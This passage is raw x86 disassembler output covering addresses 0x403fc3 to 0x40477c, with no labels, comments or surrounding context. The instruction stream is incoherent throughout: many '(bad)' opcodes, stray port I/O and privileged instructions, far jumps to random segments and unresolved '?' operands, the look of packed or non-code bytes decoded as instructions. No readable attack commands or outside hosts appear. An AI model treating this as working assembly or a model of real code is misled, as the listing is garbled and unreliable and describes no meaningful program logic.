  403fc3:	scas   al,BYTE PTR es:[edi]
  403fc4:	cli    
  403fc5:	sub    eax,0x33455c69
  403fca:	fild   DWORD PTR [eax+esi*8+0x1c773b17]
  403fd1:	(bad)  
  403fd2:	retf   0x4af9
  403fd5:	aam    0xc6
  403fd7:	pop    esp
  403fd8:	aam    0xf3
  403fda:	sub    DWORD PTR ds:0xa0222620,0x34
  403fe1:	and    BYTE PTR [ebp-0xfb96863],bh
  403fe7:	gs ins BYTE PTR es:[edi],dx
  403fe9:	xchg   edx,eax
  403fea:	gs dec esp
  403fec:	(bad)  
  403fed:	cmc    
  403fee:	scas   al,BYTE PTR es:[edi]
  403fef:	mov    BYTE PTR [eax],ah
  403ff1:	fucomip st,st(0)
  403ff3:	sbb    DWORD PTR gs:[esi],edx
  403ff6:	xchg   ebp,eax
  403ff7:	scas   al,BYTE PTR es:[edi]
  403ff8:	enter  0xc60f,0x2e
  403ffc:	mov    eax,ds:0x2a16f68a
  404001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404002:	fmul   QWORD PTR [ebx+eax*2-0x5fd5a392]
  404009:	aaa    
  40400a:	pop    edi
  40400b:	addr16 xor al,ch
  40400e:	mov    esi,es
  404010:	sahf   
  404011:	dec    esi
  404012:	xor    DWORD PTR [ebx],eax
  404014:	enter  0xe229,0x67
  404018:	and    dl,BYTE PTR [eax]
  40401a:	xchg   edi,eax
  40401b:	mov    bh,0xf5
  40401d:	mov    ebp,0xf5e5ea87
  404022:	pop    ebx
  404023:	pop    esi
  404024:	in     al,0x0
  404026:	nop
  404027:	or     al,0xbb
  404029:	lea    ecx,[edx]
  40402b:	cmp    al,bh
  40402d:	push   ebx
  40402e:	sbb    eax,0xcaa07bc7
  404033:	xlat   BYTE PTR ds:[ebx]
  404034:	pop    esi
  404035:	xor    eax,0x95e4e081
  40403a:	int    0x48
  40403c:	(bad)  [ebx+0x6e]
  40403f:	cmp    DWORD PTR [ebp-0x2a],eax
  404042:	scas   eax,DWORD PTR es:[edi]
  404043:	add    edi,edx
  404045:	std    
  404046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404047:	loop   0x404074
  404049:	ficomp WORD PTR [ebx]
  40404b:	fyl2x  
  40404d:	lods   eax,DWORD PTR ds:[esi]
  40404e:	leave  
  40404f:	outs   dx,BYTE PTR ds:[esi]
  404051:	push   0x880a8d95
  404056:	inc    bp
  404058:	cmp    ebp,eax
  40405a:	sbb    ebp,edx
  40405c:	ror    DWORD PTR [ecx+0x9219adc],cl
  404062:	and    edx,0xffffffaa
  404065:	add    BYTE PTR [edi-0x1e],dl
  404068:	adc    al,ah
  40406a:	adc    al,BYTE PTR [ecx-0x3d329366]
  404070:	jg     0x4040f1
  404072:	cmp    dh,BYTE PTR [edx]
  404074:	adc    ah,bl
  404076:	rcr    BYTE PTR [ecx],1
  404078:	jle    0x404071
  40407a:	mov    fs,edx
  40407c:	and    bh,BYTE PTR [edx-0x19ffb5d0]
  404082:	jg     0x40405c
  404084:	mov    ah,0xda
  404086:	jo     0x404009
  404088:	jge    0x4040af
  40408a:	loopne 0x404070
  40408c:	jae    0x404041
  40408e:	and    ch,BYTE PTR [bp+di-0x6e11]
  404093:	ret    0x3ef
  404096:	cmp    al,0x70
  404098:	add    BYTE PTR [ebx-0x13],dl
  40409b:	mov    dh,0x35
  40409d:	mov    ?,WORD PTR [esi+0x6e]
  4040a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a1:	push   edi
  4040a2:	(bad)  
  4040a3:	cdq    
  4040a4:	inc    eax
  4040a5:	imul   ebp,DWORD PTR [esi-0x1b],0x39
  4040a9:	mov    eax,ecx
  4040ab:	jbe    0x404044
  4040ad:	jg     0x404104
  4040af:	xchg   edi,eax
  4040b0:	xchg   esp,ecx
  4040b2:	lods   eax,DWORD PTR ds:[esi]
  4040b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040b4:	xchg   ebp,eax
  4040b5:	sahf   
  4040b6:	mov    dl,0xc7
  4040b8:	rcl    edx,cl
  4040ba:	in     eax,0x29
  4040bc:	js     0x40409b
  4040be:	pop    edx
  4040bf:	imul   ebp,eax,0xeeb9454e
  4040c5:	mov    ds:0xafc5c225,al
  4040ca:	loop   0x404083
  4040cc:	and    edx,edx
  4040ce:	rcl    esi,1
  4040d0:	loop   0x4040c1
  4040d2:	fist   DWORD PTR [edx]
  4040d4:	jae    0x4040f2
  4040d6:	sti    
  4040d7:	dec    esi
  4040d8:	rcr    BYTE PTR [ecx+edx*1+0x42],0xd8
  4040dd:	push   es
  4040de:	cmp    edi,esi
  4040e0:	mov    ah,0x1f
  4040e2:	neg    BYTE PTR [eax]
  4040e4:	jl     0x404072
  4040e6:	adc    BYTE PTR [eax-0x5911499a],bl
  4040ec:	std    
  4040ed:	mov    ebp,0x3dfaa111
  4040f2:	dec    ebx
  4040f3:	cs cld 
  4040f5:	xor    BYTE PTR [edx-0x6ef5e2d2],bl
  4040fb:	ds xchg esi,eax
  4040fd:	pop    ds
  4040fe:	imul   eax,DWORD PTR [eax],0xffffffed
  404101:	or     ecx,eax
  404103:	iret   
  404104:	xchg   dh,bh
  404106:	hlt    
  404107:	fst    DWORD PTR [ebp+0x5c70453e]
  40410d:	out    dx,al
  40410e:	add    eax,eax
  404110:	nop
  404111:	loop   0x4040f8
  404113:	adc    ah,BYTE PTR [ebx+eax*8]
  404116:	sbb    eax,0x4aab3d7a
  40411b:	or     BYTE PTR [ecx-0x8],al
  40411e:	data16 mov dl,0xed
  404121:	pop    ebx
  404122:	dec    ebp
  404123:	push   ss
  404124:	pop    ss
  404125:	cmp    cl,cl
  404127:	fstp   QWORD PTR [eax-0x45]
  40412a:	cs mov ds,ecx
  40412d:	pop    ss
  40412e:	pop    ds
  40412f:	mov    ebx,0xe4127f43
  404134:	rol    BYTE PTR [esi],0x21
  404137:	loope  0x404153
  404139:	cld    
  40413a:	dec    esp
  40413b:	push   edx
  40413c:	out    dx,al
  40413d:	loopne 0x40417f
  40413f:	pop    edx
  404140:	aaa    
  404141:	ins    BYTE PTR es:[edi],dx
  404142:	mov    ecx,0xf2a5e33e
  404147:	or     edx,esi
  404149:	push   ebx
  40414a:	mov    ch,0xec
  40414c:	push   esp
  40414d:	ret    
  40414e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40414f:	add    ch,bh
  404151:	mov    al,ds:0x210fec09
  404156:	cmp    DWORD PTR [ebx+0x6b2af01a],ebp
  40415c:	mov    dl,0x13
  40415e:	pop    ss
  40415f:	xchg   esp,eax
  404160:	(bad)  
  404161:	cmp    eax,0xe9ebd59b
  404166:	das    
  404167:	and    eax,0xdf0299fc
  40416c:	mov    ah,cl
  40416e:	mov    al,BYTE PTR [esi-0x51eee695]
  404174:	add    eax,0x1503319
  404179:	ret    0xa224
  40417c:	into   
  40417d:	adc    DWORD PTR [eax+0x55],esi
  404180:	stc    
  404181:	icebp  
  404182:	in     eax,dx
  404183:	adc    bh,al
  404185:	push   esi
  404186:	add    cl,bl
  404188:	shl    BYTE PTR [edi+0xe],cl
  40418b:	mov    ds:0xd5720049,eax
  404190:	add    cl,BYTE PTR [esi+0x7b47a652]
  404196:	or     esi,DWORD PTR [ebx]
  404198:	not    al
  40419a:	jmp    0xb94:0x4ccfc936
  4041a1:	scas   al,BYTE PTR es:[edi]
  4041a2:	cmp    dh,BYTE PTR [ebx+0xb]
  4041a5:	rol    BYTE PTR [edi+0x23b431d4],0x40
  4041ac:	or     DWORD PTR [ecx],esp
  4041ae:	mov    eax,0xf531c714
  4041b3:	loopne 0x40422d
  4041b5:	jnp    0x4041e9
  4041b7:	or     bl,BYTE PTR ds:0x98726b0a
  4041bd:	jmp    0xa5291532
  4041c2:	fisub  DWORD PTR [edx+0x5aef4c7f]
  4041c8:	rcr    DWORD PTR [eax+edx*4-0x3d],cl
  4041cc:	or     ecx,DWORD PTR [edi+0x69]
  4041cf:	adc    ebp,0x11
  4041d2:	mov    eax,ds:0xa439ac46
  4041d7:	and    al,al
  4041d9:	add    DWORD PTR [ebp-0x362fa0a6],0xa69131
  4041e3:	adc    edi,DWORD PTR ds:0x5c636eda
  4041e9:	nop
  4041ea:	cmp    eax,0x8e09b45f
  4041ef:	aad    0xc
  4041f1:	sbb    eax,0x1701404b
  4041f6:	repz push cs
  4041f8:	pop    ebp
  4041f9:	stos   BYTE PTR es:[edi],al
  4041fa:	sbb    eax,0x72446253
  4041ff:	shr    DWORD PTR [ecx],cl
  404201:	jae    0x404185
  404203:	(bad)  
  404204:	add    al,0x18
  404206:	imul   ecx,ebx,0xe861563d
  40420c:	fldcw  WORD PTR [esi]
  40420e:	jae    0x404273
  404210:	ss in  eax,0xd3
  404213:	cmp    DWORD PTR [eax-0x13],ebp
  404216:	rcr    edi,0x88
  404219:	bound  ebp,QWORD PTR [edi+0x4a5c3d75]
  40421f:	cmp    eax,eax
  404221:	(bad)  
  404222:	cmp    al,0x1e
  404224:	mov    ebp,0x37096862
  404229:	xchg   edx,eax
  40422a:	cli    
  40422b:	xlat   BYTE PTR ds:[ebx]
  40422c:	jecxz  0x4041ba
  40422e:	mov    al,ds:0x901d77d6
  404233:	cld    
  404234:	in     al,0xdf
  404236:	int3   
  404237:	cdq    
  404238:	out    dx,eax
  404239:	fstp   TBYTE PTR [esi+0x3e]
  40423c:	pop    edi
  40423d:	push   ecx
  40423e:	pop    edi
  40423f:	(bad)  
  404241:	data16 jo 0x40423e
  404244:	sbb    al,0xd7
  404246:	mov    esi,0x37ff52c8
  40424b:	sbb    BYTE PTR [esi],ah
  40424d:	pop    esi
  40424e:	cld    
  40424f:	mov    ds:0x4f0243b,al
  404254:	stos   BYTE PTR es:[edi],al
  404255:	add    DWORD PTR [eax-0x31e747eb],edx
  40425b:	push   esp
  40425c:	ret    0x587e
  40425f:	(bad)  
  404260:	dec    esi
  404261:	push   edx
  404262:	jmp    0x404268
  404264:	mov    ah,0x20
  404266:	sub    DWORD PTR [eax+0x44],esp
  404269:	sub    DWORD PTR [ebp-0x3],eax
  40426c:	xor    edx,DWORD PTR [ebp+edi*8-0x45df9b87]
  404273:	xor    esp,ecx
  404275:	sbb    edx,DWORD PTR [edi+0x3ecd33b7]
  40427b:	mov    dh,0xdc
  40427d:	rcl    ebx,1
  40427f:	test   DWORD PTR [eax*4+0x6cb62acf],edx
  404286:	pusha  
  404287:	test   BYTE PTR [esi],0xf8
  40428a:	test   BYTE PTR [edx],ch
  40428c:	mov    ebx,0x7686f0b0
  404291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404292:	cmp    al,ch
  404294:	(bad)  
  404295:	and    al,0xc8
  404297:	clc    
  404298:	jo     0x4042ef
  40429a:	xor    bl,cl
  40429c:	xlat   BYTE PTR ds:[ebx]
  40429d:	lahf   
  40429e:	xchg   esi,eax
  40429f:	lods   al,BYTE PTR ds:[esi]
  4042a0:	outs   dx,DWORD PTR ds:[esi]
  4042a1:	fdiv   DWORD PTR [eax+0x3695e568]
  4042a7:	jp     0x4042a0
  4042a9:	mov    edx,0x7a4c6734
  4042ae:	shr    DWORD PTR [eax],0x8f
  4042b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b2:	or     dl,cl
  4042b4:	fst    DWORD PTR [ecx]
  4042b6:	or     eax,0xfb25504
  4042bb:	mov    ebx,esi
  4042bd:	inc    ecx
  4042be:	ins    DWORD PTR es:[edi],dx
  4042bf:	xchg   edx,eax
  4042c0:	jg     0x4042d2
  4042c2:	mov    ebp,DWORD PTR [esi-0x3f]
  4042c5:	push   0xfa54c6c5
  4042ca:	pop    ss
  4042cb:	and    ah,BYTE PTR [edi+ebx*2]
  4042ce:	(bad)  
  4042cf:	sub    edi,DWORD PTR [esi-0x54]
  4042d2:	ret    0xb9e9
  4042d5:	sar    BYTE PTR ds:0xfe3e5555,1
  4042db:	div    DWORD PTR ds:0x7bd4e9ba
  4042e1:	or     BYTE PTR [eax+0x79],dl
  4042e4:	mov    dh,0x68
  4042e6:	jge    0x404285
  4042e8:	mov    ds:0xb65ddcb9,eax
  4042ed:	fist   DWORD PTR [edi+esi*2]
  4042f0:	and    BYTE PTR [esi-0x28d3fb48],dh
  4042f6:	mov    WORD PTR ss:[edx],?
  4042f9:	repnz mov bh,0x29
  4042fc:	fadd   QWORD PTR [eax-0x60]
  4042ff:	in     al,0xfb
  404301:	ins    DWORD PTR es:[edi],dx
  404302:	xor    BYTE PTR [esi],al
  404304:	rcl    DWORD PTR [ecx+0x5c5aa3f1],1
  40430a:	and    al,0x47
  40430c:	cmc    
  40430d:	adc    dh,BYTE PTR [ecx]
  40430f:	sub    al,0xa3
  404311:	(bad)  
  404313:	or     ebp,DWORD PTR [esi-0x5cfb46a3]
  404319:	ror    BYTE PTR [esi+0x40],cl
  40431c:	je     0x4042fa
  40431e:	retf   
  40431f:	mov    dl,dl
  404321:	dec    ebp
  404322:	lods   eax,DWORD PTR ds:[esi]
  404323:	in     eax,0x7d
  404325:	mov    edi,DWORD PTR [edx]
  404327:	fiadd  WORD PTR [ecx]
  404329:	mov    dh,BYTE PTR [ecx+0x4d6db0ee]
  40432f:	lods   al,BYTE PTR ds:[esi]
  404330:	inc    ebp
  404331:	pop    ebp
  404332:	inc    ecx
  404333:	mov    edi,0x2ebda4b9
  404338:	sar    DWORD PTR [ebp+eax*1+0x1a7f0bf2],1
  40433f:	daa    
  404340:	shl    BYTE PTR [edi],0x30
  404343:	jle    0x4042ed
  404345:	fmul   DWORD PTR [ebx]
  404347:	push   ebx
  404348:	out    dx,al
  404349:	rcl    cl,cl
  40434b:	retf   0x4b14
  40434e:	xchg   esi,eax
  40434f:	inc    ecx
  404350:	fs (bad) 
  404352:	(bad)  
  404353:	or     al,0x9
  404355:	pop    ss
  404356:	mov    edx,0x3a7114af
  40435b:	std    
  40435c:	mov    BYTE PTR [eax-0xf],bh
  40435f:	add    BYTE PTR [edi],bh
  404361:	inc    ebx
  404362:	inc    eax
  404363:	pop    es
  404364:	ins    DWORD PTR es:[edi],dx
  404365:	es xor al,0x9
  404368:	mov    ebx,0x9ff92505
  40436d:	adc    al,0xb7
  40436f:	jae    0x4042f1
  404371:	push   ebp
  404372:	retf   0x7644
  404375:	mov    ?,WORD PTR [edi-0x44]
  404378:	pusha  
  404379:	(bad)  
  40437a:	sbb    BYTE PTR [ecx-0xc8a5ff4],ah
  404380:	and    dh,cl
  404382:	int    0x24
  404384:	inc    eax
  404385:	xor    ah,BYTE PTR [eax-0x5f]
  404388:	adc    al,0x4d
  40438a:	les    ebp,FWORD PTR [eax+0x3c]
  40438d:	xchg   ebp,eax
  40438e:	mov    bl,0xb9
  404390:	sbb    edi,ebx
  404392:	push   es
  404393:	jge    0x40432d
  404395:	std    
  404396:	std    
  404397:	xor    al,0xb1
  404399:	dec    esp
  40439a:	das    
  40439b:	je     0x4043a4
  40439d:	push   esi
  40439e:	jo     0x4043c0
  4043a0:	xchg   ebx,eax
  4043a1:	push   eax
  4043a2:	xchg   esp,eax
  4043a3:	mov    edx,0x452c7c7f
  4043a8:	arpl   WORD PTR [ebp-0x3460d9a6],cx
  4043ae:	loopne 0x404426
  4043b0:	xchg   ecx,eax
  4043b1:	lods   al,BYTE PTR ds:[esi]
  4043b2:	xchg   BYTE PTR [ebp-0x49],ah
  4043b5:	ror    DWORD PTR [edx],cl
  4043b7:	mov    ebp,0x597113c5
  4043bc:	jae    0x40441c
  4043be:	cmp    al,0x38
  4043c0:	into   
  4043c1:	imul   ebx,DWORD PTR [ebp-0x51de9433],0xed441955
  4043cb:	add    al,0xc0
  4043cd:	dec    esi
  4043ce:	gs jns 0x404389
  4043d1:	dec    edi
  4043d2:	cs loopne 0x40440c
  4043d5:	out    0x12,eax
  4043d7:	sub    edx,ebp
  4043d9:	mov    ebx,0x7a05287c
  4043de:	loopne 0x404446
  4043e0:	lods   eax,DWORD PTR ds:[esi]
  4043e1:	jbe    0x40445a
  4043e3:	and    dh,BYTE PTR [esi-0x459f826d]
  4043e9:	daa    
  4043ea:	cmp    DWORD PTR [edx],ecx
  4043ec:	xchg   ebx,eax
  4043ed:	jmp    0xe9d4:0xfee073f1
  4043f4:	loope  0x404428
  4043f6:	add    edx,ecx
  4043f8:	xor    edx,edi
  4043fa:	loop   0x4043d1
  4043fc:	dec    edi
  4043fd:	and    dh,BYTE PTR [ebp-0x68]
  404400:	div    al
  404402:	xchg   esp,eax
  404403:	lods   al,BYTE PTR ds:[esi]
  404404:	push   ebp
  404405:	jno    0x4043f6
  404407:	or     ch,al
  404409:	jns    0x404446
  40440b:	mov    cl,0x2a
  40440d:	dec    edx
  40440e:	stos   DWORD PTR es:[edi],eax
  40440f:	rcr    esp,1
  404411:	inc    ebp
  404412:	gs or  edx,esi
  404415:	xlat   BYTE PTR ds:[ebx]
  404416:	jmp    0x404486
  404418:	jle    0x404475
  40441a:	xor    DWORD PTR [eax],eax
  40441c:	xor    DWORD PTR [edx+0x44c95ccf],0xd54db655
  404426:	shl    edi,cl
  404428:	shr    BYTE PTR [edi-0x3b],cl
  40442b:	add    DWORD PTR [eax-0x69344914],esp
  404431:	sub    BYTE PTR [ebx+esi*2],cl
  404434:	idiv   BYTE PTR [esi]
  404436:	pop    es
  404437:	into   
  404438:	ficomp DWORD PTR [edi-0x2]
  40443b:	out    dx,eax
  40443c:	call   0x5617e8b6
  404441:	rcr    ch,0xbd
  404444:	xchg   edx,eax
  404445:	push   esp
  404446:	or     DWORD PTR [ecx],ecx
  404448:	test   eax,0x7071fcd8
  40444d:	daa    
  40444e:	xchg   esp,eax
  40444f:	call   0xd0f3f382
  404454:	and    DWORD PTR [ebp-0x45],ebp
  404457:	shl    BYTE PTR ds:0x1550fd72,0x3f
  40445e:	ins    DWORD PTR es:[edi],dx
  40445f:	pop    edi
  404460:	int3   
  404461:	and    DWORD PTR [ebp+0x18],0x64cd4c93
  404468:	bound  esp,QWORD PTR [esi]
  40446a:	fistp  QWORD PTR [eax+0x1d]
  40446d:	or     DWORD PTR [ecx-0x27baa038],edx
  404473:	xchg   esp,eax
  404474:	outs   dx,DWORD PTR ds:[esi]
  404475:	(bad)  
  404477:	xchg   esi,eax
  404478:	sub    eax,ecx
  40447a:	mov    WORD PTR [esi-0x7bdd9ac9],?
  404480:	add    BYTE PTR [ecx+ebx*4],cl
  404483:	push   ds
  404484:	es je  0x404435
  404487:	pop    ebp
  404488:	out    dx,eax
  404489:	iret   
  40448a:	cmp    eax,ecx
  40448c:	mov    ebx,0x39319ab0
  404491:	dec    esp
  404492:	jb     0x4044a2
  404494:	cmp    edi,DWORD PTR [edx-0x45c88106]
  40449a:	lea    eax,[eax+0x55ff8fef]
  4044a0:	mov    al,0xd4
  4044a2:	adc    ebx,DWORD PTR [ebx+0xf75c301]
  4044a8:	mov    ebp,0x87ff066a
  4044ad:	scas   al,BYTE PTR es:[edi]
  4044ae:	or     al,0x77
  4044b0:	mov    cl,0x81
  4044b2:	sbb    edi,DWORD PTR [esi+0x5a]
  4044b5:	and    eax,0xe813dc51
  4044ba:	adc    DWORD PTR [esi+ebx*4+0x7c7a2dbf],ecx
  4044c1:	ror    BYTE PTR [ebx-0x27eacf9a],0x90
  4044c8:	sahf   
  4044c9:	add    DWORD PTR [edx-0x176607bc],ecx
  4044cf:	enter  0xc10c,0x9a
  4044d3:	add    BYTE PTR [edi-0xe],0x19
  4044d7:	push   edi
  4044d8:	mov    ebp,0xb099c769
  4044dd:	adc    eax,0x7f621c84
  4044e2:	mov    bp,0x1deb
  4044e6:	ficom  WORD PTR [eax+0x2a]
  4044e9:	clc    
  4044ea:	pop    edx
  4044eb:	and    bh,BYTE PTR ds:0x16ae54c3
  4044f1:	dec    ebp
  4044f2:	les    eax,FWORD PTR [ecx]
  4044f4:	cmp    ebp,eax
  4044f6:	es push ebp
  4044f8:	scas   al,BYTE PTR es:[edi]
  4044f9:	pop    eax
  4044fa:	add    DWORD PTR [esp+ecx*2-0x16],edx
  4044fe:	aas    
  4044ff:	ins    BYTE PTR es:[edi],dx
  404500:	and    DWORD PTR [eax-0x3],esp
  404503:	mov    ah,0x33
  404505:	jle    0x40454f
  404507:	cmp    BYTE PTR [esi],al
  404509:	sub    eax,0x4969c8e0
  40450e:	push   esi
  40450f:	pop    ebx
  404510:	inc    edi
  404511:	adc    eax,0xa9854012
  404516:	cdq    
  404517:	adc    eax,0x57b4abfc
  40451c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451d:	lods   al,BYTE PTR ds:[esi]
  40451e:	and    dl,bl
  404520:	xchg   DWORD PTR [edx],ecx
  404522:	push   edx
  404523:	mov    BYTE PTR [ebx-0x717f460],bh
  404529:	adc    ebx,DWORD PTR [esi+0x6e]
  40452c:	jno    0x4044bf
  40452e:	das    
  40452f:	jecxz  0x40451c
  404531:	in     al,dx
  404532:	mov    DWORD PTR [edi+edx*4+0x2b9ceb56],edx
  404539:	cli    
  40453a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40453b:	shl    DWORD PTR [edx],0xed
  40453e:	ja     0x40459c
  404540:	outs   dx,DWORD PTR ds:[esi]
  404541:	dec    DWORD PTR [ebp+0x5c]
  404544:	scas   al,BYTE PTR es:[edi]
  404545:	cmp    esi,0x1f
  404548:	into   
  404549:	fisubr DWORD PTR [ecx]
  40454b:	retf   0xd1f9
  40454e:	cld    
  40454f:	retf   
  404550:	scas   eax,DWORD PTR es:[edi]
  404551:	cmp    ch,ah
  404553:	aad    0x2f
  404555:	push   eax
  404556:	sub    BYTE PTR [ebp+ebx*2+0x63670182],cl
  40455d:	mov    eax,ds:0x9182b1b3
  404562:	mov    eax,0x1d11da41
  404567:	jg     0x4044f8
  404569:	mov    edx,DWORD PTR [edx]
  40456b:	cwde   
  40456c:	fs int3 
  40456e:	pop    esp
  40456f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404570:	outs   dx,DWORD PTR ds:[esi]
  404571:	aam    0x82
  404573:	and    DWORD PTR [ebp-0xf],0x6c
  404577:	mov    dh,0xb7
  404579:	cld    
  40457a:	mov    ch,0x12
  40457c:	div    DWORD PTR [edx-0x31b6af91]
  404582:	leave  
  404583:	es sbb eax,0xf4b61c85
  404589:	xlat   BYTE PTR ds:[ebx]
  40458a:	add    DWORD PTR [edi-0x1a429b9],edi
  404590:	lods   eax,DWORD PTR ds:[esi]
  404591:	mov    ah,0xcc
  404593:	(bad)  
  404594:	std    
  404595:	retf   
  404596:	cli    
  404597:	cmp    al,0xcf
  404599:	or     ebp,0x23cf9466
  40459f:	jb     0x404546
  4045a1:	imul   ebp,DWORD PTR [esi+edx*1-0x535b7f4b],0x30f9780
  4045ac:	jg     0x4045c8
  4045ae:	retf   
  4045af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b0:	jge    0x262b987a
  4045b6:	loop   0x4045a5
  4045b8:	mov    ss,WORD PTR [edi-0x6bd16e8d]
  4045be:	loop   0x404564
  4045c0:	mov    al,BYTE PTR [esi]
  4045c2:	sbb    dl,BYTE PTR [edx-0x75]
  4045c5:	das    
  4045c6:	or     al,0x8e
  4045c8:	xor    ebx,DWORD PTR [esi+0x2897a7ab]
  4045ce:	(bad)  [ecx+0x62]
  4045d1:	xchg   edx,eax
  4045d2:	adc    BYTE PTR [ecx+ebx*4-0x24031b21],cl
  4045d9:	ja     0x4045ad
  4045db:	outs   dx,DWORD PTR ds:[esi]
  4045dc:	in     al,0xbd
  4045de:	bound  ecx,QWORD PTR [esi+0x5c107647]
  4045e4:	jge    0x4045b7
  4045e6:	push   ebp
  4045e7:	inc    ebp
  4045e8:	mov    bh,0x93
  4045ea:	xchg   eax,edi
  4045ec:	adc    al,0xc7
  4045ee:	mov    esi,0xa709df6d
  4045f3:	data16 cmp bl,dh
  4045f6:	pushw  es
  4045f8:	mov    edx,0x1d26f685
  4045fd:	ret    
  4045fe:	xchg   ecx,eax
  4045ff:	fdiv   DWORD PTR [ecx-0x7c305af8]
  404605:	(bad)  
  404606:	and    ch,BYTE PTR [eax-0x3b]
  404609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40460a:	std    
  40460b:	(bad)  
  40460d:	outs   dx,BYTE PTR ds:[esi]
  40460e:	cmp    bl,dh
  404610:	inc    BYTE PTR [ebx+esi*2]
  404613:	adc    ecx,DWORD PTR [esi]
  404615:	push   cs
  404616:	cmp    al,BYTE PTR [ebx-0x52]
  404619:	jmp    0x40463f
  40461b:	or     eax,0x69d25bd2
  404620:	xchg   ecx,eax
  404621:	sbb    al,0x79
  404623:	mov    eax,0x3c35d684
  404628:	into   
  404629:	mov    eax,0x974c5802
  40462e:	jmp    0xa784:0xc2d92c3e
  404635:	dec    eax
  404636:	add    esi,DWORD PTR [ecx-0x13]
  404639:	xchg   edx,eax
  40463b:	call   DWORD PTR [esi]
  40463d:	dec    ebx
  40463e:	jge    0x404642
  404640:	repnz cli 
  404642:	xchg   esi,eax
  404643:	cmp    eax,0x55a4e1c6
  404648:	cdq    
  404649:	xor    BYTE PTR [eax+0xc],bh
  40464c:	in     al,0x87
  40464e:	(bad)  
  40464f:	cwde   
  404650:	sub    dh,BYTE PTR [ebp+0x1de07618]
  404656:	ins    BYTE PTR es:[edi],dx
  404657:	mov    edi,0x207814d9
  40465c:	fs icebp 
  40465e:	retf   
  40465f:	xor    ch,BYTE PTR [ebp+0x30c4ba5d]
  404665:	shl    DWORD PTR [edx+0x4d],cl
  404668:	(bad)  [ecx+ebx*4-0x376f346f]
  40466f:	push   0xffffffd9
  404671:	jmp    0x40468c
  404673:	mov    ecx,0x80d960a2
  404678:	xchg   esi,eax
  404679:	mov    bl,0xd9
  40467b:	bnd ret 
  40467d:	loopne 0x404601
  40467f:	imul   DWORD PTR [edx+0x11]
  404682:	xor    eax,0x187c5dab
  404687:	loopne 0x4046dd
  404689:	inc    esp
  40468a:	sbb    BYTE PTR [eax],dh
  40468c:	rcl    BYTE PTR ds:0x4c967d4d,0xcb
  404693:	js     0x404655
  404695:	(bad)  
  404696:	adc    eax,0xc0130bf0
  40469b:	std    
  40469c:	push   cs
  40469d:	test   BYTE PTR [ebx],0x20
  4046a0:	push   ebp
  4046a1:	test   bh,0xfc
  4046a4:	in     eax,dx
  4046a5:	xchg   DWORD PTR [edx+0x421d452],edi
  4046ab:	cvtdq2ps xmm6,XMMWORD PTR [edx-0x54]
  4046af:	scas   al,BYTE PTR es:[edi]
  4046b0:	aam    0xb1
  4046b2:	xchg   esp,eax
  4046b3:	add    BYTE PTR [edi],cl
  4046b5:	sbb    al,0x78
  4046b7:	jbe    0x4046b3
  4046b9:	xor    BYTE PTR ds:0x1dff6bbd,dl
  4046bf:	mov    ds:0x922b19dc,al
  4046c4:	adc    edx,DWORD PTR [ebp-0x2d14accb]
  4046ca:	or     DWORD PTR [ebx+0x50],ebp
  4046cd:	arpl   WORD PTR [edx-0x23603208],bp
  4046d3:	sahf   
  4046d4:	aam    0x23
  4046d6:	or     edx,DWORD PTR [edx+0x47]
  4046d9:	xchg   ecx,eax
  4046da:	out    dx,eax
  4046db:	jne    0x404690
  4046dd:	or     dl,BYTE PTR [ebx+0x74]
  4046e0:	jg     0x404750
  4046e2:	sbb    al,BYTE PTR [ebp+0x1a60fab8]
  4046e8:	dec    al
  4046ea:	addr16 jne 0x404722
  4046ed:	ret    
  4046ee:	add    bl,BYTE PTR [ebx+ebx*2]
  4046f1:	add    al,0xdf
  4046f3:	cmp    ebx,0xffffffc7
  4046f6:	xchg   ecx,eax
  4046f7:	es push ebp
  4046f9:	popf   
  4046fa:	arpl   WORD PTR [edi-0x62],bp
  4046fd:	pop    ebx
  4046fe:	ret    0xac5a
  404701:	cmp    al,0x98
  404703:	pop    edi
  404704:	push   0xd6500f9d
  404709:	xor    BYTE PTR [edi],0x3c
  40470c:	xor    al,0x16
  40470e:	cwde   
  40470f:	and    BYTE PTR [eax+0x74],bl
  404712:	leave  
  404713:	add    BYTE PTR [edx+0x1a],dl
  404716:	out    dx,al
  404717:	adc    BYTE PTR [ecx+0x4d7ad388],dl
  40471d:	stc    
  40471e:	mov    eax,ds:0x7ef9114a
  404723:	inc    ecx
  404724:	jne    0x404797
  404726:	add    DWORD PTR [eax],esi
  404728:	or     BYTE PTR [edx-0x67],dh
  40472b:	xor    DWORD PTR [eax-0x11],esi
  40472e:	cmp    BYTE PTR cs:[edx+eiz*1+0x20018bc0],dl
  404736:	fwait
  404737:	dec    esp
  404738:	iret   
  404739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40473a:	stos   DWORD PTR es:[edi],eax
  40473b:	cmp    DWORD PTR [ecx+0x74],edi
  40473e:	push   0x940b9ca3
  404743:	iret   
  404744:	(bad)  
  404746:	outs   dx,DWORD PTR ds:[esi]
  404747:	cs stos DWORD PTR es:[edi],eax
  404749:	add    bl,BYTE PTR [ebx+eiz*2+0x66385da6]
  404750:	mov    ds:0xacc343cc,eax
  404755:	jne    0x404733
  404757:	mov    eax,0xd3bbd7bf
  40475c:	cmp    BYTE PTR [esi+0x49117ee3],bl
  404762:	(bad)  [ecx]
  404764:	dec    ecx
  404765:	test   al,0xe7
  404767:	aaa    
  404768:	jbe    0x404767
  40476a:	stc    
  40476b:	out    dx,al
  40476c:	lds    eax,FWORD PTR [edx-0x444ce181]
  404772:	out    0x36,eax
  404774:	shl    DWORD PTR [edi],1
  404776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404777:	xlat   BYTE PTR ds:[ebx]
  404778:	pop    ebp
  404779:	into   
  40477a:	push   ss
  40477b:	xlat   BYTE PTR ds:[ebx]
  40477c:	ins    BYTE PTR es:[edi],dx
